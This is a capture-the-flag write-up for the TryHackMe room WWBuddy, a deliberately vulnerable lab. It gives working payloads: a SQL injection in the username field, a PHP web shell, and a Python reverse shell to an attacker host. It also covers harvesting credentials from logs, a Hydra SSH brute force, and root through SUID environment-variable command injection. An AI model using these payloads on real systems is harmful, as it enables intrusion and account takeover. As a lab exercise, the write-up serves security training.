# [WWBuddy](https://tryhackme.com/room/wwbuddy)

## Exploit this website still in development and root the room.

World wide buddy is a site for making friends, but it's still unfinished and it has some security flaws.

Deploy the machine and find the flags hidden in the room!

### Website flag

1. Navigate to `http://<TARGET_IP>/register/` and create a new account with any credentials.

2. Log in to the application at `http://<TARGET_IP>/login/` using your newly created credentials.

3. Go to your profile page and change your username to `' 1=1 or -- -`. This SQL injection payload bypasses authentication checks by making the SQL query always return true.

<img width="982" height="702" alt="SCREEN01" src="https://github.com/user-attachments/assets/042b3c09-5735-463c-9fa2-c07e30bb6978" />

4. Navigate to `http://<TARGET_IP>/change/` and set a new password.

5. Log out and log back in using the username `WWBuddy` with the password you just set. This works because the SQL injection allowed us to take over the admin account.

6. After logging in as `WWBuddy`, you'll notice two new users appear: `Henry` and `Roberto`.

<img width="1005" height="645" alt="SCREEN02" src="https://github.com/user-attachments/assets/ab0642df-16d0-49e3-ac37-42cc25266e7c" />

7. In the chat messages between `Henry` and `Roberto`, Roberto mentions that the default SSH password format is based on birthday dates.

<img width="991" height="540" alt="SCREEN03" src="https://github.com/user-attachments/assets/4bf815c9-ec6f-47f7-b8ff-8df4eee13799" />

8. Run a directory enumeration scan to discover hidden endpoints:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/images               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/images/]
/login                (Status: 301) [Size: 314] [--> http://<TARGET_IP>/login/]
/register             (Status: 301) [Size: 317] [--> http://<TARGET_IP>/register/]
/profile              (Status: 301) [Size: 316] [--> http://<TARGET_IP>/profile/]
/admin                (Status: 301) [Size: 314] [--> http://<TARGET_IP>/admin/]
/js                   (Status: 301) [Size: 311] [--> http://<TARGET_IP>/js/]
/api                  (Status: 301) [Size: 312] [--> http://<TARGET_IP>/api/]
/styles               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/styles/]
/change               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/change/]
/server-status        (Status: 403) [Size: 278]
```

9. Access `http://<TARGET_IP>/admin/` as `Henry`.

10. View the page source to find the first flag embedded in an HTML comment:

<img width="1044" height="298" alt="SCREEN04" src="https://github.com/user-attachments/assets/1f3a5c17-e3e1-4456-89db-8755e60c71fc" />

---

### User flag

_Some people have only one password ..._

1. Change your username from `' 1=1 or -- -` to `<?php system($_GET["cmd"]) ?>`.

2. Set up a netcat listener on your attack machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

3. Log in as `Henry` and access the admin page with a command injection payload in the URL. This Python reverse shell will connect back to your listener:

```
http://<TARGET_IP>/admin/?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<ATTACKER_IP>%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

4. Search for sensitive information in log files. MySQL general logs often contain accidentally typed credentials:

```bash
cat /var/log/mysql/general.log
```

<img width="1194" height="430" alt="SCREEN06" src="https://github.com/user-attachments/assets/d5f53bdc-cd2b-450e-91c1-b0a94342dfbe" />

You'll find that Roberto accidentally typed his password `yVnocsXsf%X68wf`

5. SSH into the machine as Roberto:

```bash
ssh roberto@<TARGET_IP>
```

6. List files in Roberto's home directory and read the important note:

```bash
ls
cat importante.txt
```

**Content (Portuguese):**

```
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{g**********k}

```

---

### Root flag

1. The Portuguese message from `importante.txt` translates to English as:

```
Jenny will be so happy when she finds out she got hired :DD

Don't forget that next week she turns 26, and when she sees the present I bought her, maybe she'll even be inspired to go on a date with me.
```

2. Check date of the file:

```bash
ls -l
```

```
total 4
-rw-rw-r-- 1 roberto roberto 246 Jul 27  2020 importante.txt
```

3. Based on the hint from Roberto's message and the earlier chat about birthday-based passwords, we need to figure out Jenny's birth date. If she's turning 26 next week, she was born in 1994.

Create a Python script to generate possible password combinations based on various date formats:

```python
year = "1994"
month = "08"

with open("passwords.txt", "w") as f:
    for i in range(1, 32):
        day = str(i).zfill(2)

        f.write("{}{}{}".format(year, month, day) + "\n")
        f.write("{}{}{}".format(day, month, year) + "\n")
        f.write("{}{}{}".format(month, day, year) + "\n")
        f.write("{}-{}-{}".format(year, month, day) + "\n")
        f.write("{}-{}-{}".format(day, month, year) + "\n")
        f.write("{}-{}-{}".format(month, day, year) + "\n")
        f.write("{}/{}/{}".format(year, month, day) + "\n")
        f.write("{}/{}/{}".format(day, month, year) + "\n")
        f.write("{}/{}/{}".format(month, day, year) + "\n")
```

4. Run the script and use Hydra to brute-force Jenny's SSH password:

```bash
python3 generate_passwords.py
hydra -l jenny -P passwords.txt ssh://<TARGET_IP>
```

<img width="949" height="247" alt="SCREEN07" src="https://github.com/user-attachments/assets/642572a4-1a99-4ce2-9678-e6445f703a2f" />

**Discovered credentials:** `jenny:08/03/1994`

5. SSH into the machine as Jenny:

```bash
ssh jenny@<TARGET_IP>
```

6. Search for SUID binaries that might be exploitable:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Notable finding:** `/bin/authenticate` - This is not a standard Linux binary and warrants investigation.

<img width="533" height="459" alt="SCREEN05" src="https://github.com/user-attachments/assets/1057f527-07f9-4e1f-a737-f07f25841e69" />

7. Download the binary to your attack machine for analysis:

```bash
scp jenny@<TARGET_IP>:/bin/authenticate .
```

8. Analyze the binary using **Ghidra**. Navigate to `Symbol Tree > Functions > main` to examine the decompiled code:

```c
undefined8 main(void)

{
  __uid_t _Var1;
  int iVar2;
  char *__src;
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  if ((int)_Var1 < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar2 = system("groups | grep developer");
    if (iVar2 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      _Var1 = getuid();
      setuid(0);
      builtin_strncpy(local_48,"usermod -G developer ",0x16);
      local_48[0x16] = '\0';
      local_48[0x17] = '\0';
      local_48[0x18] = '\0';
      local_48[0x19] = '\0';
      local_48[0x1a] = '\0';
      local_48[0x1b] = '\0';
      local_48[0x1c] = '\0';
      local_48[0x1d] = '\0';
      local_48[0x1e] = '\0';
      local_48[0x1f] = '\0';
      local_48[0x20] = '\0';
      local_48[0x21] = '\0';
      local_48[0x22] = '\0';
      local_48[0x23] = '\0';
      local_48[0x24] = '\0';
      local_48[0x25] = '\0';
      local_48[0x26] = '\0';
      local_48[0x27] = '\0';
      local_48[0x28] = '\0';
      local_48[0x29] = '\0';
      local_48[0x2a] = '\0';
      local_48[0x2b] = '\0';
      local_48[0x2c] = 0;
      strncat(local_48,__src,0x14);
      system(local_48);
      puts("Group updated");
      setuid(_Var1);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**Vulnerability Analysis:**

- The binary runs with SUID root privileges
- It reads the `USER` environment variable without sanitization
- It concatenates this value directly into a command
- The command is executed via `system()` with root privileges
- This allows command injection by manipulating the `USER` environment variable

9. Exploit the vulnerability by injecting commands through the `USER` environment variable. Retrieve the root flag:

```bash
$ echo $USER
jenny
$ export USER="jenny; sh"
$ echo $USER
jenny; sh
$ /bin/authenticate
# whoami
root
# ls -la /root
total 36
drwx------  4 root root 4096 Jul 28  2020 .
drwxr-xr-x 23 root root 4096 Jul 25  2020 ..
-rw-------  1 root root   74 Jul 28  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jul 24  2020 .local
-rw-------  1 root root  157 Jul 24  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   28 Jul 28  2020 root.txt
drwx------  2 root root 4096 Jul 24  2020 .ssh
# cat /root/root.txt
THM{c********************t}
```
